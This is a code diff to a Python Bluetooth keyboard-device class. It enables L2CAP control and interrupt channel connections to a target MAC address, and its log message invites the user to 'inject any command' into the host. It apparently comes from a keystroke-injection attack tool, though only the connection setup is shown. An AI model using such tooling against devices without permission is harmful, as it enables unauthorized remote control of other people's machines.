@@ -57,18 +57,18 @@ class KbDevice():
         logger.status(msg=f"Attempting to connect to {self.MAC_ADDRESS}...")
 
         # コントロールチャンネルの作成と接続
-#        self.scontrol = socket.socket(socket.AF_BLUETOOTH, 
-#                                      socket.SOCK_SEQPACKET, 
-#                                      consts.BTPROTO_L2CAP)
-#        self.scontrol.connect((self.MAC_ADDRESS, self.P_CTRL))
-#        logger.status(f"Connected to the control channel of {self.MAC_ADDRESS} at {self.P_CTRL}")
+        self.scontrol = socket.socket(socket.AF_BLUETOOTH, 
+                                     socket.SOCK_SEQPACKET, 
+                                     consts.BTPROTO_L2CAP)
+        self.scontrol.connect((self.MAC_ADDRESS, self.P_CTRL))
+        logger.status(f"Connected to the control channel of {self.MAC_ADDRESS} at {self.P_CTRL}")
 
         # 割り込みチャンネルの作成と接続
-#        self.sinterrupt = socket.socket(socket.AF_BLUETOOTH, 
-#                                        socket.SOCK_SEQPACKET, 
-#                                        consts.BTPROTO_L2CAP)
-#        self.sinterrupt.connect((self.MAC_ADDRESS, self.P_INTR))
-#        logger.status(f"Connected to the interrupt channel of {self.MAC_ADDRESS} at {self.P_INTR}")
+        self.sinterrupt = socket.socket(socket.AF_BLUETOOTH, 
+                                       socket.SOCK_SEQPACKET, 
+                                       consts.BTPROTO_L2CAP)
+        self.sinterrupt.connect((self.MAC_ADDRESS, self.P_INTR))
+        logger.status(f"Connected to the interrupt channel of {self.MAC_ADDRESS} at {self.P_INTR}")
         logger.success("You can inject any command you wish. Start a new terminal and try command injection with the make boot/injector command !!")
 
     # send a string to the bluetooth host machine
